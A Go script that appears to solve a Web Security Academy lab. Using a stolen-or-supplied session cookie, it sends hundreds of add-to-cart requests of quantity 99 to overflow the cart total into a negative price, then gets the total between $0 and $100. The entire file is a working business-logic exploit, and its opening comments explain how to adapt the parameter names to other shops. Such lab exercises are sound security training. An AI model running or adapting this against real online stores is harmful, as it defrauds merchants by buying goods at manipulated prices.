// Different shops might use different parameter names like item_id instead of productId or qty instead of quantity.
// So you might need to adjust this based on what you see in the network requests when manually adding items to the cart.

package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"time"
)

func main() {
	targetURL := flag.String("url", "https://YOUR-LAB-ID.web-security-academy.net/cart", "Target URL")
	sessionCookie := flag.String("cookie", "", "Session cookie value")
	productId := flag.String("productid", "1", "Product ID to add to cart")
	requestCount := flag.Int("count", 323, "Number of requests to send")
	delay := flag.Int("delay", 100, "Delay between requests in milliseconds")
	flag.Parse()

	if *sessionCookie == "" {
		fmt.Println("Please provide a session cookie value with -cookie")
		return
	}

	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	cookieURL, err := url.Parse(*targetURL)
	if err != nil {
		fmt.Printf("Error parsing URL: %v\n", err)
		return
	}
	
	cookies := []*http.Cookie{
		{
			Name:   "session",
			Value:  *sessionCookie,
			Path:   "/",
			Domain: strings.Replace(cookieURL.Hostname(), "www.", "", 1),
		},
	}
	client.Jar.SetCookies(cookieURL, cookies)

	fmt.Printf("Starting to send %d requests to add product %s to cart\n", *requestCount, *productId)
	fmt.Printf("Target URL: %s\n", *targetURL)

	for i := 1; i <= *requestCount; i++ {
		payload := fmt.Sprintf("productId=%s&quantity=99&redir=CART", *productId)
		req, err := http.NewRequest("POST", *targetURL, bytes.NewBufferString(payload))
		if err != nil {
			fmt.Printf("Error creating request: %v\n", err)
			continue
		}

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("Error sending request: %v\n", err)
			continue
		}

		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		if i%10 == 0 || i == *requestCount {
			fmt.Printf("Sent %d requests (%.1f%%)\n", i, float64(i)/float64(*requestCount)*100)
		}

		time.Sleep(time.Duration(*delay) * time.Millisecond)
	}

	fmt.Println("\nCompleted! Now check your cart to see the negative price.")
	fmt.Println("You may need to add a few more items to get the total between $0 and $100.")
}
